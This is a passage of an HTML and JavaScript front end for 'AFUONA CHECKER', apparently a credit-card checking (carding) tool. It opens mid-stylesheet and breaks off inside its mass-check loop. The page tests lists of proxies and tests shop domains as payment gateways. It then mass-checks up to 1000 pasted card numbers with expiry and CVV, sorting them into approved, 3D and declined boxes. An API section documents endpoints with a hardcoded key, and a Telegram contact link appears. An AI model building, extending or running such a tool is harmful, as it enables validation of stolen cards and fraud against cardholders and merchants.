            box-shadow: 0 0 20px rgba(255, 0, 0, 0.2);
        }
        
        .result-box.threed-box {
            border-color: #ff6b4d;
            box-shadow: 0 0 20px rgba(255,107,77,0.2);
        }
        
        .result-box.working-box {
            border-color: #00ff00;
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.2);
        }
        
        .result-box.dead-box {
            border-color: #ff0000;
            box-shadow: 0 0 20px rgba(255, 0, 0, 0.2);
        }
        
        .box-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 12px 15px;
            background: rgba(0, 0, 0, 0.3);
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
            flex-wrap: wrap;
            gap: 10px;
        }
        
        .box-title {
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: clamp(1rem, 2.5vw, 1.2rem);
            font-weight: 600;
        }
        
        .box-title.approved { color: #00ff00; }
        .box-title.declined { color: #ff0000; }
        .box-title.threed { color: #ff6b4d; }
        .box-title.working { color: #00ff00; }
        .box-title.dead { color: #ff0000; }
        
        .box-count {
            background: rgba(255, 255, 255, 0.1);
            padding: 3px 10px;
            border-radius: 20px;
            font-size: 0.9rem;
        }
        
        .copy-box-btn {
            background: transparent;
            border: 1px solid currentColor;
            color: inherit;
            padding: 5px 12px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 0.8rem;
            transition: all 0.3s;
            display: flex;
            align-items: center;
            gap: 5px;
        }
        
        .copy-box-btn:hover {
            background: rgba(255, 255, 255, 0.1);
        }
        
        .box-content {
            padding: 12px 15px;
            max-height: 300px;
            overflow-y: auto;
        }
        
        .box-item {
            background: rgba(0, 0, 0, 0.2);
            border-radius: 8px;
            padding: 10px 12px;
            margin-bottom: 8px;
            border-left: 3px solid;
            font-family: monospace;
            font-size: clamp(0.75rem, 2vw, 0.9rem);
            word-break: break-all;
        }
        
        .box-item.approved-item { border-left-color: #00ff00; }
        .box-item.declined-item { border-left-color: #ff0000; }
        .box-item.threed-item { border-left-color: #ff6b4d; }
        
        .item-domain {
            color: #ff6b4d;
            margin-bottom: 3px;
        }
        
        .item-response {
            color: #888;
            font-size: 0.8rem;
            margin: 3px 0;
        }
        
        .item-status {
            display: inline-block;
            padding: 2px 8px;
            border-radius: 12px;
            font-size: 0.7rem;
            font-weight: 600;
        }
        
        .item-status.approved {
            background: rgba(0, 255, 0, 0.2);
            color: #00ff00;
        }
        
        .item-status.declined {
            background: rgba(255, 0, 0, 0.2);
            color: #ff0000;
        }
        
        .item-status.threed {
            background: rgba(255,107,77,0.2);
            color: #ff6b4d;
        }
        
        @media (max-width: 768px) {
            .cyber-tab {
                min-width: 100%;
            }
            
            .button-group {
                flex-direction: column;
            }
            
            .cyber-btn {
                width: 100%;
                justify-content: center;
            }
            
            .box-header {
                flex-direction: column;
                align-items: flex-start;
            }
            
            .copy-box-btn {
                width: 100%;
                justify-content: center;
            }
        }
        
        @media (max-width: 480px) {
            .cyber-header {
                flex-direction: column;
                align-items: flex-start;
            }
            
            .status-panel {
                width: 100%;
                justify-content: space-between;
            }
            
            .proxy-stats {
                grid-template-columns: 1fr;
            }
            
            .proxy-item {
                flex-direction: column;
                align-items: flex-start;
            }
        }
    </style>
</head>
<body>
    <div class="cyber-grid"></div>
    <div class="neon-circle"></div>
    <div class="neon-circle-2"></div>
    
    <!-- أيقونة تليجرام عائمة -->
    <div class="telegram-float">
        <a href="https://t.me/afuonax" target="_blank" title="Telegram">
            <i class="fab fa-telegram"></i>
        </a>
    </div>
    
    <div class="container">
        <div class="cyber-header">
            <div class="logo-container">
                <span class="logo-glow">AFUONA CHECKER</span>
                <span class="badge-neon">v2.0</span>
            </div>
            <div class="status-panel">
                <div class="status-item">
                    <span class="status-dot"></span>
                    <span>API ONLINE</span>
                </div>
                <div class="status-item">
                    <i class="fas fa-shield-alt" style="color: #ff6b4d;"></i>
                    <span>PROXY READY</span>
                </div>
            </div>
        </div>
        
        <!-- تبويبات -->
        <div class="cyber-tabs">
            <div class="cyber-tab" onclick="switchTab('proxy')">
                <i class="fas fa-network-wired"></i>
                PROXY HUB
            </div>
            <div class="cyber-tab" onclick="switchTab('tester')">
                <i class="fas fa-globe"></i>
                SITE TESTER
            </div>
            <div class="cyber-tab active" onclick="switchTab('mass')">
                <i class="fas fa-bolt"></i>
                MASS CHECKER
            </div>
            <div class="cyber-tab" onclick="switchTab('api')">
                <i class="fas fa-code"></i>
                API
            </div>
        </div>
        
        <!-- PROXY HUB -->
        <div id="proxy-tab" class="tab-content" style="display: none;">
            <div class="nova-card">
                <div class="card-header">
                    <h3><i class="fas fa-network-wired"></i> PROXY HUB (MAX 100 PROXIES)</h3>
                </div>
                
                <div class="status-message" id="proxy-status-message">
                    ⚠️ Add and test proxies
                </div>
                
                <div class="cyber-input-group">
                    <label><i class="fas fa-list"></i> PROXY LIST (one per line - MAX 100)</label>
                    <textarea id="proxy-list-input" class="cyber-input cyber-textarea" placeholder="192.168.1.1:8080
user:pass@192.168.1.1:8080
socks5://192.168.1.1:1080"></textarea>
                </div>
                
                <div class="button-group">
                    <button class="cyber-btn cyber-btn-primary" onclick="testAllProxies()">
                        <i class="fas fa-sync-alt"></i>
                        TEST PROXIES
                    </button>
                    <button class="cyber-btn cyber-btn-secondary" onclick="clearProxies()">
                        <i class="fas fa-trash"></i>
                        CLEAR
                    </button>
                </div>
                
                <div class="proxy-panel">
                    <h4 style="margin-bottom: 20px; color: #ff6b4d;">PROXY STATISTICS</h4>
                    <div class="proxy-stats">
                        <div class="proxy-stat">
                            <div class="proxy-stat-value" id="total-proxies">0</div>
                            <div class="proxy-stat-label">TOTAL</div>
                        </div>
                        <div class="proxy-stat">
                            <div class="proxy-stat-value" id="working-proxies">0</div>
                            <div class="proxy-stat-label">WORKING</div>
                        </div>
                        <div class="proxy-stat">
                            <div class="proxy-stat-value" id="dead-proxies">0</div>
                            <div class="proxy-stat-label">DEAD</div>
                        </div>
                    </div>
                    
                    <h4 style="margin: 20px 0 10px; color: #ff6b4d;">PROXY LIST</h4>
                    <div id="proxy-list-container" class="proxy-list"></div>
                </div>
            </div>
        </div>
        
        <!-- SITE TESTER -->
        <div id="tester-tab" class="tab-content" style="display: none;">
            <div class="nova-card">
                <div class="card-header">
                    <h3><i class="fas fa-globe"></i> SITE TESTER (MAX 50 SITES)</h3>
                    <span class="card-badge">PROXY REQUIRED</span>
                </div>
                
                <div class="status-message" id="tester-status-message">
                    ⚠️ Test proxies first in PROXY HUB
                </div>
                
                <div class="cyber-input-group">
                    <label><i class="fas fa-globe"></i> SITES (max 50, one per line)</label>
                    <textarea id="tester-sites" class="cyber-input cyber-textarea" placeholder="shop1.com
shop2.com
shop3.com"></textarea>
                </div>
                
                <div class="cyber-input-group">
                    <label><i class="fas fa-network-wired"></i> PROXY</label>
                    <input type="text" id="tester-proxy" class="cyber-input" placeholder="host:port:user:pass OR host:port">
                    <div class="toggle-container">
                        <div class="toggle-switch">
                            <span class="toggle-label">🔓 Optional</span>
                            <label class="toggle-switch">
                                <input type="checkbox" id="proxy-required-tester">
                                <span class="toggle-slider"></span>
                            </label>
                            <span class="toggle-label">🔒 Required</span>
                        </div>
                        <span id="proxy-warning-tester" class="proxy-warning">⚠️ Proxy is required!</span>
                    </div>
                </div>
                
                <div class="button-group">
                    <button class="cyber-btn cyber-btn-primary" onclick="testSites()">
                        <i class="fas fa-search"></i>
                        TEST SITES
                    </button>
                    <button class="cyber-btn cyber-btn-secondary" onclick="clearTesterResults()">
                        <i class="fas fa-trash"></i>
                        CLEAR
                    </button>
                </div>
                
                <div id="tester-progress" style="margin: 20px 0; display: none;">
                    <div>TESTING SITES... <span id="tester-progress-count">0/0</span></div>
                </div>
                
                <div id="tester-results" class="results-container"></div>
            </div>
        </div>
        
        <!-- MASS CHECKER -->
        <div id="mass-tab" class="tab-content active" style="display: block;">
            <div class="nova-card">
                <div class="card-header">
                    <h3><i class="fas fa-bolt" style="margin-right: 15px;"></i>MASS CHECKER (MAX 1000 CARDS)</h3>
                </div>
                
                <div class="status-message success" id="mass-ready-message" style="display: none;">
                    ✅ Ready to check cards!
                </div>
                
                <div class="status-message error" id="mass-error-message" style="display: none;">
                    ❌ No working resources. Please add proxies and sites first.
                </div>
                
                <div class="cyber-input-group">
                    <label><i class="fas fa-globe"></i> SELECTED SITES (working)</label>
                    <select id="mass-site-select" class="cyber-input" multiple size="3">
                        <option value="">No working sites</option>
                    </select>
                </div>
                
                <div class="cyber-input-group">
                    <label><i class="fas fa-network-wired"></i> SELECTED PROXIES (working)</label>
                    <select id="mass-proxy-select" class="cyber-input" multiple size="3">
                        <option value="">No working proxies</option>
                    </select>
                </div>
                
                <div class="cyber-input-group">
                    <label><i class="fas fa-credit-card"></i> CARDS (one per line - MAX 1000)</label>
                    <textarea id="mass-cards" class="cyber-input cyber-textarea" placeholder="4242424242424242|12|25|123
4000000000000002|12|25|123"></textarea>
                </div>
                
                <div class="cyber-input-group">
                    <label><i class="fas fa-network-wired"></i> PROXY</label>
                    <input type="text" id="mass-proxy" class="cyber-input" placeholder="host:port:user:pass OR host:port">
                    <div class="toggle-container">
                        <div class="toggle-switch">
                            <span class="toggle-label">🔓 Optional</span>
                            <label class="toggle-switch">
                                <input type="checkbox" id="proxy-required-mass">
                                <span class="toggle-slider"></span>
                            </label>
                            <span class="toggle-label">🔒 Required</span>
                        </div>
                        <span id="proxy-warning-mass" class="proxy-warning">⚠️ Proxy is required!</span>
                    </div>
                </div>
                
                <div class="button-group">
                    <button class="cyber-btn cyber-btn-primary" onclick="startMassCheck()">
                        <i class="fas fa-play"></i>
                        START MASS CHECK
                    </button>
                    <button class="cyber-btn cyber-btn-secondary" onclick="clearMassResults()">
                        <i class="fas fa-trash"></i>
                        CLEAR
                    </button>
                    <button class="cyber-btn cyber-btn-danger" onclick="stopMassCheck()" id="stop-mass-btn" style="display: none;">
                        <i class="fas fa-stop"></i>
                        STOP
                    </button>
                </div>
                
                <div id="mass-progress" style="margin: 20px 0; display: none;">
                    <div style="display: flex; justify-content: space-between; margin-bottom: 10px; flex-wrap: wrap; gap: 10px;">
                        <span>PROGRESS: <span id="mass-progress-count">0/0</span></span>
                        <span>APPROVED: <span id="mass-approved">0</span> | 3D: <span id="mass-threed">0</span> | DECLINED: <span id="mass-declined">0</span></span>
                    </div>
                    <div style="height: 10px; background: rgba(255,107,77,0.1); border-radius: 5px; overflow: hidden;">
                        <div id="mass-progress-bar" style="height: 100%; width: 0%; background: linear-gradient(90deg, #ff6b4d, #ff3333); transition: width 0.3s;"></div>
                    </div>
                </div>
                
                <div id="mass-status" style="margin: 20px 0; display: none;"></div>
                
                <div id="mass-results" class="results-container"></div>
                
                <div id="mass-continue-container" style="margin-top: 20px; display: none;">
                    <button class="cyber-btn cyber-btn-primary" onclick="continueMassCheck()">
                        <i class="fas fa-play"></i>
                        CONTINUE CHECK
                    </button>
                </div>
            </div>
        </div>
        
        <!-- API -->
        <div id="api-tab" class="tab-content" style="display: none;">
            <div class="nova-card">
                <div class="card-header">
                    <h3><i class="fas fa-code"></i> API DOCUMENTATION</h3>
                    <span class="card-badge">AFUONA API</span>
                </div>
                
                <div class="result-neon" style="margin-bottom: 20px; padding: 20px; border-radius: 15px; background: rgba(0,0,0,0.3);">
                    <h4 style="color: #ff6b4d; margin-bottom: 15px;">MASS CHECK API</h4>
                    <p><strong>Endpoint:</strong> /check</p>
                    <p><strong>Method:</strong> GET</p>
                    <p><strong>API Key:</strong> afuona_2026</p>
                    <p><strong>Parameters:</strong></p>
                    <ul style="margin-left: 20px; margin-bottom: 15px;">
                        <li><code>key</code> - API Key (afuona_2026)</li>
                        <li><code>site</code> - Target domain</li>
                        <li><code>proxy</code> - Proxy (REQUIRED)</li>
                        <li><code>cc</code> - Card data</li>
                    </ul>
                    <p><strong>Example:</strong></p>
                    <div style="background: rgba(0,0,0,0.4); padding: 15px; border-radius: 10px; font-family: monospace; margin-bottom: 15px; word-break: break-all;">
                        https://YOUR-DOMAIN/check?key=afuona_2026&site=example.com&proxy=192.168.1.1:8080&cc=424242|12|25|123
                    </div>
                    <button class="copy-btn" style="background: transparent; border: 1px solid #ff6b4d; color: #ff6b4d; padding: 8px 15px; border-radius: 10px; cursor: pointer; width: fit-content;" onclick="copyToClipboard('https://YOUR-DOMAIN/check?key=afuona_2026&site=example.com&proxy=192.168.1.1:8080&cc=424242|12|25|123')">
                        <i class="fas fa-copy"></i> COPY
                    </button>
                </div>
                
                <div class="result-neon" style="padding: 20px; border-radius: 15px; background: rgba(0,0,0,0.3);">
                    <h4 style="color: #ff6b4d; margin-bottom: 15px;">SITE TESTER API</h4>
                    <p><strong>Endpoint:</strong> /test_site</p>
                    <p><strong>Method:</strong> GET</p>
                    <p><strong>API Key:</strong> afuona_2026</p>
                    <p><strong>Parameters:</strong></p>
                    <ul style="margin-left: 20px; margin-bottom: 15px;">
                        <li><code>key</code> - API Key (afuona_2026)</li>
                        <li><code>proxy</code> - Proxy (REQUIRED)</li>
                        <li><code>site</code> - Site domain</li>
                    </ul>
                    <p><strong>Example:</strong></p>
                    <div style="background: rgba(0,0,0,0.4); padding: 15px; border-radius: 10px; font-family: monospace; margin-bottom: 15px; word-break: break-all;">
                        https://YOUR-DOMAIN/test_site?key=afuona_2026&proxy=192.168.1.1:8080&site=shop1.com
                    </div>
                    <button class="copy-btn" style="background: transparent; border: 1px solid #ff6b4d; color: #ff6b4d; padding: 8px 15px; border-radius: 10px; cursor: pointer; width: fit-content;" onclick="copyToClipboard('https://YOUR-DOMAIN/test_site?key=afuona_2026&proxy=192.168.1.1:8080&site=shop1.com')">
                        <i class="fas fa-copy"></i> COPY
                    </button>
                </div>
            </div>
        </div>
        
        <div class="cyber-footer">
            <div>AFUONA © 2026</div>
        </div>
    </div>
    
    <script>
        // ==================== GLOBAL VARIABLES ====================
        let proxyPool = [];
        let workingProxies = [];
        let workingSites = [];
        let currentMassCheck = {
            running: false,
            cards: [],
            currentIndex: 0,
            approved: 0,
            declined: 0,
            threed: 0,
            results: []
        };
        
        // ==================== PROXY MODE TRACKING ====================
        let proxyRequiredMass = false;
        let proxyRequiredTester = false;
        
        // ==================== TAB SWITCHING ====================
        function switchTab(tabName) {
            document.querySelectorAll('.tab-content').forEach(tab => {
                tab.style.display = 'none';
            });
            document.querySelectorAll('.cyber-tab').forEach(tab => {
                tab.classList.remove('active');
            });
            
            document.getElementById(tabName + '-tab').style.display = 'block';
            event.target.classList.add('active');
            
            if (tabName === 'mass') {
                updateMassCheckerStatus();
            }
        }
        
        // ==================== PROXY TOGGLE FUNCTIONS ====================
        function setupProxyToggle(checkboxId, inputId, warningId) {
            const checkbox = document.getElementById(checkboxId);
            const proxyInput = document.getElementById(inputId);
            const warning = document.getElementById(warningId);
            
            if (!checkbox) return;
            
            function updateMode() {
                if (checkbox.checked) {
                    warning.classList.add('show');
                    proxyInput.placeholder = 'host:port:user:pass OR host:port (REQUIRED)';
                    if (checkboxId === 'proxy-required-mass') proxyRequiredMass = true;
                    if (checkboxId === 'proxy-required-tester') proxyRequiredTester = true;
                } else {
                    warning.classList.remove('show');
                    proxyInput.placeholder = 'host:port:user:pass OR host:port (optional)';
                    if (checkboxId === 'proxy-required-mass') proxyRequiredMass = false;
                    if (checkboxId === 'proxy-required-tester') proxyRequiredTester = false;
                }
            }
            
            checkbox.addEventListener('change', updateMode);
            updateMode();
        }
        
        function isProxyRequired(tabName) {
            if (tabName === 'mass') return proxyRequiredMass;
            if (tabName === 'tester') return proxyRequiredTester;
            return false;
        }
        
        function getProxyInput(tabName) {
            if (tabName === 'mass') return document.getElementById('mass-proxy').value.trim();
            if (tabName === 'tester') return document.getElementById('tester-proxy').value.trim();
            return '';
        }
        
        function validateProxy(tabName) {
            const required = isProxyRequired(tabName);
            const proxy = getProxyInput(tabName);
            
            if (required && !proxy) {
                alert('⚠️ Proxy is required! Please enter a proxy or disable the requirement.');
                return false;
            }
            return true;
        }
        
        // ==================== COPY FUNCTIONS ====================
        function copyToClipboard(text) {
            if (navigator.clipboard && navigator.clipboard.writeText) {
                navigator.clipboard.writeText(text)
                    .then(() => {
                        alert('✅ Copied to clipboard!');
                    })
                    .catch(() => {
                        fallbackCopy(text);
                    });
            } else {
                fallbackCopy(text);
            }
        }

        function fallbackCopy(text) {
            const textarea = document.createElement('textarea');
            textarea.value = text;
            textarea.style.position = 'fixed';
            textarea.style.opacity = '0';
            document.body.appendChild(textarea);
            textarea.select();
            textarea.setSelectionRange(0, 99999);
            
            try {
                const successful = document.execCommand('copy');
                if (successful) {
                    alert('✅ Copied to clipboard!');
                } else {
                    alert('❌ Copy failed. Please select and copy manually.');
                }
            } catch (err) {
                alert('❌ Copy failed. Please select and copy manually.');
                console.error(err);
            }
            
            document.body.removeChild(textarea);
        }
        
        // ==================== PROXY FUNCTIONS ====================
        function parseProxy(proxyString) {
            proxyString = proxyString.trim();
            let proxyType = 'http';
            
            if (proxyString.match(/^(socks5|socks4|http|https):\/\//i)) {
                proxyType = proxyString.split('://')[0].toLowerCase();
                proxyString = proxyString.split('://')[1];
            }
            
            let host = '', port = '', username = '', password = '';
            
            let match = proxyString.match(/^([^:@]+):([^@]+)@([^:@]+):(\d+)$/);
            if (match) {
                username = match[1];
                password = match[2];
                host = match[3];
                port = match[4];
            }
            else if (proxyString.match(/^([^:]+):(\d+):([^:]+):(.+)$/)) {
                match = proxyString.match(/^([^:]+):(\d+):([^:]+):(.+)$/);
                host = match[1];
                port = match[2];
                username = match[3];
                password = match[4];
            }
            else if (proxyString.match(/^([^:@]+):(\d+)$/)) {
                match = proxyString.match(/^([^:@]+):(\d+)$/);
                host = match[1];
                port = match[2];
            }
            
            if (!host || !port) return null;
            
            let proxyUrl;
            if (username && password) {
                proxyUrl = `${proxyType}://${username}:${password}@${host}:${port}`;
            } else {
                proxyUrl = `${proxyType}://${host}:${port}`;
            }
            
            return {
                original: proxyString,
                url: proxyUrl,
                host,
                port,
                working: null,
                responseTime: null
            };
        }
        
        async function testProxy(proxy) {
            const startTime = Date.now();
            try {
                const response = await fetch(`/test_proxy?proxy=${encodeURIComponent(proxy.original)}`);
                const data = await response.json();
                const responseTime = Date.now() - startTime;
                
                if (data.success) {
                    proxy.working = true;
                    proxy.responseTime = responseTime;
                } else {
                    proxy.working = false;
                }
            } catch (error) {
                proxy.working = false;
            }
            return proxy;
        }
        
        async function testAllProxies() {
            const proxyText = document.getElementById('proxy-list-input').value;
            const proxyStrings = proxyText.split('\\n').filter(p => p.trim()).slice(0, 100);
            
            document.getElementById('total-proxies').textContent = proxyStrings.length;
            
            proxyPool = proxyStrings.map(p => parseProxy(p)).filter(p => p !== null);
            
            const results = [];
            for (let proxy of proxyPool) {
                results.push(await testProxy(proxy));
            }
            
            workingProxies = results.filter(p => p.working).sort((a, b) => a.responseTime - b.responseTime);
            
            document.getElementById('working-proxies').textContent = workingProxies.length;
            document.getElementById('dead-proxies').textContent = proxyPool.length - workingProxies.length;
            
            displayProxyList();
            
            if (workingProxies.length > 0) {
                document.getElementById('proxy-status-message').className = 'status-message success';
                document.getElementById('proxy-status-message').innerHTML = '✅ ' + workingProxies.length + ' working proxies found';
            } else {
                document.getElementById('proxy-status-message').className = 'status-message error';
                document.getElementById('proxy-status-message').innerHTML = '❌ No working proxies found';
            }
        }
        
        function displayProxyList() {
            const container = document.getElementById('proxy-list-container');
            container.innerHTML = '';
            
            proxyPool.forEach(proxy => {
                const proxyItem = document.createElement('div');
                proxyItem.className = `proxy-item ${proxy.working ? 'working' : 'dead'}`;
                
                let statusBadge = proxy.working 
                    ? `<span class="proxy-status-badge badge-working">WORKING ${proxy.responseTime}ms</span>`
                    : `<span class="proxy-status-badge badge-dead">DEAD</span>`;
                
                proxyItem.innerHTML = `
                    <div>
                        <i class="fas fa-server" style="color: ${proxy.working ? '#00ff00' : '#ff0000'}"></i>
                        <span>${proxy.host}:${proxy.port}</span>
                    </div>
                    ${statusBadge}
                `;
                
                container.appendChild(proxyItem);
            });
        }
        
        function clearProxies() {
            proxyPool = [];
            workingProxies = [];
            document.getElementById('proxy-list-input').value = '';
            document.getElementById('proxy-list-container').innerHTML = '';
            document.getElementById('total-proxies').textContent = '0';
            document.getElementById('working-proxies').textContent = '0';
            document.getElementById('dead-proxies').textContent = '0';
            document.getElementById('proxy-status-message').className = 'status-message';
            document.getElementById('proxy-status-message').innerHTML = '⚠️ Add and test proxies';
        }
        
        // ==================== SITE TESTER FUNCTIONS ====================
        async function testSites() {
            if (workingProxies.length === 0 && isProxyRequired('tester')) {
                alert('You must have working proxies first! Go to PROXY HUB');
                return;
            }
            
            if (!validateProxy('tester')) return;
            
            const sitesText = document.getElementById('tester-sites').value.trim();
            const sites = sitesText.split('\\n').filter(s => s.trim()).slice(0, 50);
            
            if (sites.length === 0) {
                alert('Enter at least one site');
                return;
            }
            
            document.getElementById('tester-progress').style.display = 'block';
            document.getElementById('tester-results').innerHTML = '';
            
            let working = [];
            let dead = [];
            let completed = 0;
            
            createEmptySiteBoxes();
            
            for (let site of sites) {
                const proxy = workingProxies.length > 0 ? workingProxies[0] : null;
                const proxyValue = proxy ? proxy.original : getProxyInput('tester');
                
                try {
                    let url = `/test_site?key=afuona_2026&site=${encodeURIComponent(site)}`;
                    if (proxyValue && isProxyRequired('tester')) {
                        url += `&proxy=${encodeURIComponent(proxyValue)}`;
                    } else if (proxyValue && !isProxyRequired('tester')) {
                        url += `&proxy=${encodeURIComponent(proxyValue)}`;
                    }
                    
                    const response = await fetch(url);
                    const data = await response.json();
                    
                    if (data.working) {
                        working.push({
                            domain: site,
                            status: data.status,
                            response: data.response
                        });
                        addSiteToBox('working', site, data.status, data.response);
                    } else {
                        dead.push({
                            domain: site,
                            status: data.status,
                            response: data.response
                        });
                        addSiteToBox('dead', site, data.status, data.response);
                    }
                    
                } catch (error) {
                    dead.push({
                        domain: site,
                        status: 'ERROR',
                        response: error.message
                    });
                    addSiteToBox('dead', site, 'ERROR', error.message);
                }
                
                completed++;
                document.getElementById('tester-progress-count').textContent = `${completed}/${sites.length}`;
            }
            
            document.getElementById('tester-progress').style.display = 'none';
            
            if (working.length > 0) {
                document.getElementById('tester-status-message').className = 'status-message success';
                document.getElementById('tester-status-message').innerHTML = '✅ ' + working.length + ' working sites found';
                updateBoxCount('working', working.length);
            } else {
                document.getElementById('tester-status-message').className = 'status-message error';
                document.getElementById('tester-status-message').innerHTML = '❌ No working sites found';
            }
            
            if (dead.length > 0) {
                updateBoxCount('dead', dead.length);
            }
            
            workingSites = working.map(w => ({ domain: w.domain, status: w.status }));
            updateMassCheckerStatus();
        }
        
        function createEmptySiteBoxes() {
            const container = document.getElementById('tester-results');
            container.innerHTML = '';
            
            const workingBox = document.createElement('div');
            workingBox.className = 'result-box working-box';
            workingBox.id = 'working-sites-box';
            workingBox.innerHTML = `
                <div class="box-header">
                    <div class="box-title working">
                        <i class="fas fa-check-circle"></i>
                        WORKING SITES (<span id="working-count">0</span>)
                    </div>
                    <button class="copy-box-btn" onclick="copyBoxContent('working')">
                        <i class="fas fa-copy"></i> COPY
                    </button>
                </div>
                <div id="working-content" class="box-content"></div>
            `;
            
            const deadBox = document.createElement('div');
            deadBox.className = 'result-box dead-box';
            deadBox.id = 'dead-sites-box';
            deadBox.innerHTML = `
                <div class="box-header">
                    <div class="box-title dead">
                        <i class="fas fa-times-circle"></i>
                        DEAD SITES (<span id="dead-count">0</span>)
                    </div>
                    <button class="copy-box-btn" onclick="copyBoxContent('dead')">
                        <i class="fas fa-copy"></i> COPY
                    </button>
                </div>
                <div id="dead-content" class="box-content"></div>
            `;
            
            container.appendChild(workingBox);
            container.appendChild(deadBox);
        }
        
        function addSiteToBox(type, domain, status, response) {
            const contentDiv = document.getElementById(type + '-content');
            const countSpan = document.getElementById(type + '-count');
            
            const itemDiv = document.createElement('div');
            itemDiv.className = 'box-item';
            itemDiv.innerHTML = `
                <div class="item-domain">🌐 ${domain}</div>
                <div class="item-response">${response || 'No response'}</div>
                <span class="item-status ${status === 'LIVE' ? 'approved' : status === '3D' ? 'threed' : 'declined'}">${status}</span>
            `;
            
            contentDiv.appendChild(itemDiv);
            
            let currentCount = parseInt(countSpan.textContent);
            countSpan.textContent = currentCount + 1;
        }
        
        function updateBoxCount(type, count) {
            document.getElementById(type + '-count').textContent = count;
        }
        
        function clearTesterResults() {
            document.getElementById('tester-results').innerHTML = '';
            document.getElementById('tester-sites').value = '';
            document.getElementById('tester-proxy').value = '';
            document.getElementById('tester-status-message').className = 'status-message';
            document.getElementById('tester-status-message').innerHTML = '⚠️ Test proxies first in PROXY HUB';
            document.getElementById('proxy-required-tester').checked = false;
            proxyRequiredTester = false;
            workingSites = [];
            updateMassCheckerStatus();
        }
        
        // ==================== MASS CHECKER FUNCTIONS ====================
        function updateMassCheckerStatus() {
            const siteSelect = document.getElementById('mass-site-select');
            const proxySelect = document.getElementById('mass-proxy-select');
            const readyMessage = document.getElementById('mass-ready-message');
            const errorMessage = document.getElementById('mass-error-message');
            
            siteSelect.innerHTML = '';
            if (workingSites.length > 0) {
                workingSites.forEach((site, index) => {
                    const option = document.createElement('option');
                    option.value = site.domain;
                    option.text = `${site.domain} (${site.status})`;
                    if (index === 0) option.selected = true;
                    siteSelect.appendChild(option);
                });
            } else {
                siteSelect.innerHTML = '<option value="">No working sites</option>';
            }
            
            proxySelect.innerHTML = '';
            if (workingProxies.length > 0) {
                workingProxies.forEach((proxy, index) => {
                    const option = document.createElement('option');
                    option.value = proxy.original;
                    option.text = `${proxy.host}:${proxy.port} (${proxy.responseTime}ms)`;
                    if (index === 0) option.selected = true;
                    proxySelect.appendChild(option);
                });
            } else {
                proxySelect.innerHTML = '<option value="">No working proxies</option>';
            }
            
            if (workingSites.length > 0 && (workingProxies.length > 0 || !proxyRequiredMass)) {
                readyMessage.style.display = 'block';
                errorMessage.style.display = 'none';
            } else {
                readyMessage.style.display = 'none';
                errorMessage.style.display = 'block';
            }
        }
        
        function createEmptyMassBoxes() {
            const container = document.getElementById('mass-results');
            container.innerHTML = '';
            
            const approvedBox = document.createElement('div');
            approvedBox.className = 'result-box approved-box';
            approvedBox.id = 'approved-box';
            approvedBox.innerHTML = `
                <div class="box-header">
                    <div class="box-title approved">
                        <i class="fas fa-check-circle"></i>
                        APPROVED CARDS (<span id="approved-count">0</span>)
                    </div>
                    <button class="copy-box-btn" onclick="copyBoxContent('approved')">
                        <i class="fas fa-copy"></i> COPY
                    </button>
                </div>
                <div id="approved-content" class="box-content"></div>
            `;
            
            const threedBox = document.createElement('div');
            threedBox.className = 'result-box threed-box';
            threedBox.id = 'threed-box';
            threedBox.innerHTML = `
                <div class="box-header">
                    <div class="box-title threed">
                        <i class="fas fa-shield-alt"></i>
                        3D CARDS (<span id="threed-count">0</span>)
                    </div>
                    <button class="copy-box-btn" onclick="copyBoxContent('threed')">
                        <i class="fas fa-copy"></i> COPY
                    </button>
                </div>
                <div id="threed-content" class="box-content"></div>
            `;
            
            const declinedBox = document.createElement('div');
            declinedBox.className = 'result-box declined-box';
            declinedBox.id = 'declined-box';
            declinedBox.innerHTML = `
                <div class="box-header">
                    <div class="box-title declined">
                        <i class="fas fa-times-circle"></i>
                        DECLINED CARDS (<span id="declined-count">0</span>)
                    </div>
                    <button class="copy-box-btn" onclick="copyBoxContent('declined')">
                        <i class="fas fa-copy"></i> COPY
                    </button>
                </div>
                <div id="declined-content" class="box-content"></div>
            `;
            
            container.appendChild(approvedBox);
            container.appendChild(threedBox);
            container.appendChild(declinedBox);
        }
        
        function addCardToBox(type, card, response) {
            const contentDiv = document.getElementById(type + '-content');
            const countSpan = document.getElementById(type + '-count');
            
            const itemDiv = document.createElement('div');
            itemDiv.className = 'box-item ' + type + '-item';
            itemDiv.innerHTML = `
                <div>💳 ${card}</div>
                <div class="item-response">${response}</div>
                <span class="item-status ${type}">${type.toUpperCase()}</span>
            `;
            
            contentDiv.appendChild(itemDiv);
            
            let currentCount = parseInt(countSpan.textContent);
            countSpan.textContent = currentCount + 1;
        }
        
        async function startMassCheck() {
            if (workingSites.length === 0) {
                alert('You need working sites first! Go to SITE TESTER');
                return;
            }
            
            if (proxyRequiredMass && workingProxies.length === 0) {
                alert('Proxy is required! Please add working proxies in PROXY HUB or disable proxy requirement.');
                return;
            }
            
            const cardsText = document.getElementById('mass-cards').value.trim();
            const cards = cardsText.split('\\n').filter(c => c.trim()).slice(0, 1000);
            
            if (cards.length === 0) {
                alert('Enter at least one card');
                return;
            }
            
            const site = workingSites[0].domain;
            const proxy = proxyRequiredMass && workingProxies.length > 0 ? workingProxies[0] : null;
            
            currentMassCheck = {
                running: true,
                cards: cards,
                currentIndex: 0,
                approved: 0,
                declined: 0,
                threed: 0,
                results: []
            };
            
            document.getElementById('mass-progress').style.display = 'block';
            createEmptyMassBoxes();
            document.getElementById('mass-continue-container').style.display = 'none';
            document.getElementById('stop-mass-btn').style.display = 'inline-block';
            
            document.getElementById('mass-progress-count').textContent = `0/${cards.length}`;
            document.getElementById('mass-progress-bar').style.width = '0%';
            document.getElementById('mass-approved').textContent = '0';
            document.getElementById('mass-declined').textContent = '0';
            document.getElementById('mass-threed').textContent = '0';
            
            await processNextCard(site, proxy);
        }
        
        async function processNextCard(site, proxy) {
            if (!currentMassCheck.running) return;
            
            if (currentMassCheck.currentIndex >= currentMassCheck.cards.length) {
                currentMassCheck.running = false;
                document.getElementById('stop-mass-btn').style.display = 'none';
                document.getElementById('mass-status').innerHTML = '<div class="status-message success">✅ Mass check completed!</div>';
                return;
            }
            
            const card = currentMassCheck.cards[currentMassCheck.currentIndex];
            
            try {
                let url = `/check?key=afuona_2026&site=${encodeURIComponent(site)}&cc=${encodeURIComponent(card)}`;
                if (proxy) {
